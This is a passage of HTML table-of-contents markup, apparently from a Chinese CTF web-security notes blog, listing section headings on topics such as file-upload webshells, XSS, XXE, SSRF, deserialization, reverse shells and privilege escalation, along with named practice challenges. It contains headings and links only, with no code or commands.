class="toc-text">PNG二次渲染</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JPG%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="toc-number">1.13.11.3.</span> <span class="toc-text">JPG二次渲染</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97"><span class="toc-number">1.13.12.</span> <span class="toc-text">不包含字母和数字</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%82%E6%88%96"><span class="toc-number">1.13.12.1.</span> <span class="toc-text">异或</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D"><span class="toc-number">1.13.12.2.</span> <span class="toc-text">取反</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E"><span class="toc-number">1.13.12.3.</span> <span class="toc-text">自增</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E5%90%8D%E4%BC%A0%E9%A9%AC"><span class="toc-number">1.13.13.</span> <span class="toc-text">通过文件名传马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.13.14.</span> <span class="toc-text">常用一句话木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.13.15.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-easyupload"><span class="toc-number">1.13.15.1.</span> <span class="toc-text">攻防世界 easyupload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-upload-NSSCTF"><span class="toc-number">1.13.15.2.</span> <span class="toc-text">UUCTF 2022 新生赛]ez_upload | NSSCTF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-%E8%BF%90%E7%94%A8-htaccess"><span class="toc-number">1.13.15.3.</span> <span class="toc-text">BUUCTF在线评测 运用.htaccess</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-GetShell"><span class="toc-number">1.13.15.4.</span> <span class="toc-text">BUUCTF在线评测 GetShell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-EasyWeb"><span class="toc-number">1.13.15.5.</span> <span class="toc-text">BUUCTF在线评测 EasyWeb</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXS"><span class="toc-number">1.14.</span> <span class="toc-text">XXS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-number">1.14.1.</span> <span class="toc-text">存储型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-number">1.14.2.</span> <span class="toc-text">反射型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8B"><span class="toc-number">1.14.3.</span> <span class="toc-text">DOM型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">1.14.4.</span> <span class="toc-text">攻击方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#script%E6%A0%87%E7%AD%BE"><span class="toc-number">1.14.4.1.</span> <span class="toc-text">script标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#img%E6%A0%87%E7%AD%BE"><span class="toc-number">1.14.4.2.</span> <span class="toc-text">img标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#input%E6%A0%87%E7%AD%BE"><span class="toc-number">1.14.4.3.</span> <span class="toc-text">input标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#details%E6%A0%87%E7%AD%BE"><span class="toc-number">1.14.4.4.</span> <span class="toc-text">details标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#svg%E6%A0%87%E7%AD%BE"><span class="toc-number">1.14.4.5.</span> <span class="toc-text">svg标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#select%E6%A0%87%E7%AD%BE"><span class="toc-number">1.14.4.6.</span> <span class="toc-text">select标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iframe%E6%A0%87%E7%AD%BE"><span class="toc-number">1.14.4.7.</span> <span class="toc-text">iframe标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#video%E6%A0%87%E7%AD%BE"><span class="toc-number">1.14.4.8.</span> <span class="toc-text">video标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#audio%E6%A0%87%E7%AD%BE"><span class="toc-number">1.14.4.9.</span> <span class="toc-text">audio标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#body%E6%A0%87%E7%AD%BE"><span class="toc-number">1.14.4.10.</span> <span class="toc-text">body标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#textarea%E6%A0%87%E7%AD%BE"><span class="toc-number">1.14.4.11.</span> <span class="toc-text">textarea标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#base%E6%A0%87%E7%AD%BE"><span class="toc-number">1.14.4.12.</span> <span class="toc-text">base标签</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%83%A8%E5%88%86%E7%BB%95%E8%BF%87"><span class="toc-number">1.14.5.</span> <span class="toc-text">部分绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.14.5.1.</span> <span class="toc-text">括号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URL%E7%BB%95%E8%BF%87"><span class="toc-number">1.14.5.2.</span> <span class="toc-text">URL绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.14.5.3.</span> <span class="toc-text">伪协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Function"><span class="toc-number">1.14.5.4.</span> <span class="toc-text">利用Function</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%88%E5%AF%B9CSS%E7%9A%84XSS"><span class="toc-number">1.14.6.</span> <span class="toc-text">针对CSS的XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML"><span class="toc-number">1.15.</span> <span class="toc-text">XML</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">1.15.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD"><span class="toc-number">1.15.2.</span> <span class="toc-text">DTD</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E9%83%A8%E5%A3%B0%E6%98%8E"><span class="toc-number">1.15.2.1.</span> <span class="toc-text">内部声明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E5%BC%95%E5%85%A5"><span class="toc-number">1.15.2.2.</span> <span class="toc-text">外部引入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E4%BD%93%EF%BC%88ENTITY%EF%BC%89"><span class="toc-number">1.15.2.3.</span> <span class="toc-text">实体（ENTITY）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML%E6%B3%A8%E5%85%A5"><span class="toc-number">1.15.3.</span> <span class="toc-text">XML注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5-XXE"><span class="toc-number">1.15.4.</span> <span class="toc-text">XML外部实体注入(XXE)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%8E%AF%E5%A2%83"><span class="toc-number">1.15.4.1.</span> <span class="toc-text">常见环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91"><span class="toc-number">1.15.4.2.</span> <span class="toc-text">探测内网</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DDos%E6%94%BB%E5%87%BB"><span class="toc-number">1.15.4.3.</span> <span class="toc-text">DDos攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload"><span class="toc-number">1.15.5.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-1"><span class="toc-number">1.15.6.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-Fake-XML-CookBOOK"><span class="toc-number">1.15.6.1.</span> <span class="toc-text">BUUCTF在线评测 Fake XML CookBOOK</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-MoeCTF-2025-10-revenge"><span class="toc-number">1.15.6.2.</span> <span class="toc-text">题目 - MoeCTF 2025 10_revenge</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-True-XML-Cookbook"><span class="toc-number">1.15.6.3.</span> <span class="toc-text">BUUCTF在线评测 True XML Cookbook</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">1.16.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FASTCGI"><span class="toc-number">1.16.1.</span> <span class="toc-text">FASTCGI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">1.16.2.</span> <span class="toc-text">危险函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.16.3.</span> <span class="toc-text">危险协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-4"><span class="toc-number">1.16.4.</span> <span class="toc-text">@绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E5%8F%A5%E5%8F%B7%E6%9B%BF%E6%8D%A2-%E2%80%9C-%E2%80%9D"><span class="toc-number">1.16.5.</span> <span class="toc-text">用句号替换 “.”</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xip-io-%E5%92%8C-xip-name-%E7%BB%95%E8%BF%87"><span class="toc-number">1.16.6.</span> <span class="toc-text">xip.io 和 xip.name 绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%88%E5%AF%B9127-0-0-1%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.16.7.</span> <span class="toc-text">针对127.0.0.1的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="toc-number">1.16.8.</span> <span class="toc-text">DNS重绑定</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0%E7%BB%9FSSRF%E8%BF%87%E6%BB%A4"><span class="toc-number">1.16.8.1.</span> <span class="toc-text">传统SSRF过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web%E6%B5%8F%E8%A7%88%E5%99%A8%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-SOP"><span class="toc-number">1.16.8.2.</span> <span class="toc-text">Web浏览器同源策略(SOP)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%94%BB%E5%87%BB"><span class="toc-number">1.16.8.3.</span> <span class="toc-text">DNS重绑定攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.16.8.4.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-2"><span class="toc-number">1.16.9.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%9A%BE%E5%BA%A65-babyweb%EF%BC%88%E5%9B%BD%E8%B5%9B%EF%BC%89"><span class="toc-number">1.16.9.1.</span> <span class="toc-text">攻防世界 难度5_babyweb（国赛）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%9A%BE%E5%BA%A65-ssrfme"><span class="toc-number">1.16.9.2.</span> <span class="toc-text">攻防世界 难度5_ssrfme</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SDCTF-2022-CURL-Up-and-Read-NSSCTF"><span class="toc-number">1.16.9.3.</span> <span class="toc-text">[SDCTF 2022]CURL Up and Read | NSSCTF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-SSRFME"><span class="toc-number">1.16.9.4.</span> <span class="toc-text">BUUCTF在线评测 SSRFME</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NSSRound-20-Basic-CSDN-To-PDF-V1-2-NSSCTF"><span class="toc-number">1.16.9.5.</span> <span class="toc-text">NSSRound#20 Basic]CSDN_To_PDF V1.2 | NSSCTF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">1.17.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-6"><span class="toc-number">1.17.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-CSRF"><span class="toc-number">1.17.2.</span> <span class="toc-text">XSS+CSRF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT"><span class="toc-number">1.18.</span> <span class="toc-text">JWT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5-1"><span class="toc-number">1.18.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.18.2.</span> <span class="toc-text">应用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.18.3.</span> <span class="toc-text">格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F"><span class="toc-number">1.18.4.</span> <span class="toc-text">工作方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CTF%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">1.18.5.</span> <span class="toc-text">CTF中的应用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-EasyLogin"><span class="toc-number">1.18.5.1.</span> <span class="toc-text">BUUCTF在线评测  EasyLogin</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.19.</span> <span class="toc-text">反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.19.1.</span> <span class="toc-text">为什么需要序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-7"><span class="toc-number">1.19.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95"><span class="toc-number">1.19.3.</span> <span class="toc-text">魔法方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#isset"><span class="toc-number">1.19.3.1.</span> <span class="toc-text">__isset()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wakeup"><span class="toc-number">1.19.3.2.</span> <span class="toc-text">__wakeup</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#construct"><span class="toc-number">1.19.3.3.</span> <span class="toc-text">__construct</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#destruct"><span class="toc-number">1.19.3.4.</span> <span class="toc-text">__destruct</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep"><span class="toc-number">1.19.3.5.</span> <span class="toc-text">__sleep()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get-amp-set"><span class="toc-number">1.19.3.6.</span> <span class="toc-text">__get()  &amp; __set()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#call"><span class="toc-number">1.19.3.7.</span> <span class="toc-text">__call()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#invoke"><span class="toc-number">1.19.3.8.</span> <span class="toc-text">__invoke()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#toString-NaN"><span class="toc-number">1.19.3.9.</span> <span class="toc-text">__toString()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#call-user-func-array"><span class="toc-number">1.19.3.10.</span> <span class="toc-text">call_user_func_array()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#create-function"><span class="toc-number">1.19.3.11.</span> <span class="toc-text">create_function()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E5%AF%B9%E8%B1%A1stdClass"><span class="toc-number">1.19.3.12.</span> <span class="toc-text">空对象stdClass()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%A1%BA%E5%BA%8F"><span class="toc-number">1.19.4.</span> <span class="toc-text">调用顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">1.19.5.</span> <span class="toc-text">利用魔法方法进行攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%B8%80%E8%88%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.19.6.</span> <span class="toc-text">php一般反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize-NSSCTF-ez-unserialize"><span class="toc-number">1.19.6.1.</span> <span class="toc-text">[SWPUCTF 2021 新生赛]ez_unserialize | NSSCTF ez_unserialize</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-wakeup"><span class="toc-number">1.19.7.</span> <span class="toc-text">绕过__wakeup()</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web-php-unserialize"><span class="toc-number">1.19.7.1.</span> <span class="toc-text">攻防世界 Web_php_unserialize</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POP%E9%93%BE"><span class="toc-number">1.19.8.</span> <span class="toc-text">POP链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ISCC2025-%E7%8A%AF%E6%88%91%E5%A4%A7%E5%90%B4%E7%96%86%E5%9C%9F"><span class="toc-number">1.19.8.1.</span> <span class="toc-text">ISCC2025 犯我大吴疆土</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LitCTF-2025-%E5%90%9B%E3%81%AE%E5%90%8D%E3%81%AF-NSSCTF"><span class="toc-number">1.19.8.2.</span> <span class="toc-text">LitCTF 2025]君の名は | NSSCTF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GHCTF-2025-Popppppp-NSSCTF"><span class="toc-number">1.19.8.3.</span> <span class="toc-text">GHCTF 2025]Popppppp | NSSCTF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-MoeCTF-2025"><span class="toc-number">1.19.8.4.</span> <span class="toc-text">题目 - MoeCTF 2025</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-number">1.19.9.</span> <span class="toc-text">字符逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-easy-serialize-php"><span class="toc-number">1.19.9.1.</span> <span class="toc-text">BUUCTF在线评测 easy_serialize_php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-%E9%80%83"><span class="toc-number">1.19.9.2.</span> <span class="toc-text">BUUCTF在线评测 逃</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6"><span class="toc-number">1.19.10.</span> <span class="toc-text">GC回收机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-MoreFast"><span class="toc-number">1.19.10.1.</span> <span class="toc-text">BUUCTF在线评测 MoreFast</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2025H-amp-NCTF-2025H-amp-N-CTF-ez-php"><span class="toc-number">1.19.10.2.</span> <span class="toc-text">2025H&amp;NCTF - 2025H&amp;N::CTF ez_php</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.19.11.</span> <span class="toc-text">Phar反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.19.11.0.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%87%E8%AF%86"><span class="toc-number">1.19.11.0.2.</span> <span class="toc-text">标识</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.19.11.0.3.</span> <span class="toc-text">漏洞利用条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#phar%E7%94%9F%E6%88%90"><span class="toc-number">1.19.11.0.4.</span> <span class="toc-text">phar生成</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">1.19.11.0.5.</span> <span class="toc-text">绕过方式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%88%A9%E7%94%A8-sql"><span class="toc-number">1.19.11.0.6.</span> <span class="toc-text">其他利用(sql)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-3"><span class="toc-number">1.19.11.0.7.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ezphar"><span class="toc-number">1.19.11.1.</span> <span class="toc-text">ezphar</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-Ez-to-getFlag"><span class="toc-number">1.19.11.1.1.</span> <span class="toc-text">BUUCTF在线评测 Ez to getFlag</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass"><span class="toc-number">1.19.11.2.</span> <span class="toc-text">bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#NSSRound-4-SWPU-1zweb-NSSCTF"><span class="toc-number">1.19.11.2.1.</span> <span class="toc-text">NSSRound#4 SWPU]1zweb | NSSCTF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.19.12.</span> <span class="toc-text">Pickle反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-1"><span class="toc-number">1.19.12.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.19.12.2.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#python%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.19.12.2.1.</span> <span class="toc-text">python对象</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.19.12.2.2.</span> <span class="toc-text">Python面向对象</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.19.12.2.3.</span> <span class="toc-text">关于序列化和反序列化的函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#python%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.19.12.2.4.</span> <span class="toc-text">python魔术方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%88"><span class="toc-number">1.19.12.2.5.</span> <span class="toc-text">栈</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFPVM"><span class="toc-number">1.19.12.2.6.</span> <span class="toc-text">什么是PVM</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-number">1.19.12.3.</span> <span class="toc-text">语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">1.19.12.4.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E5%8F%98%E9%87%8F"><span class="toc-number">1.19.12.4.1.</span> <span class="toc-text">覆盖变量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RCE"><span class="toc-number">1.19.12.4.2.</span> <span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.19.12.4.3.</span> <span class="toc-text">实例化对象</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-4"><span class="toc-number">1.19.12.5.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-Pickle-store"><span class="toc-number">1.19.12.5.1.</span> <span class="toc-text">BUUCTF在线评测 Pickle store</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-ikun"><span class="toc-number">1.19.12.5.2.</span> <span class="toc-text">BUUCTF在线评测 ikun</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.20.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUID%E6%8F%90%E6%9D%83"><span class="toc-number">1.21.</span> <span class="toc-text">SUID提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.22.</span> <span class="toc-text">内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.22.1.</span> <span 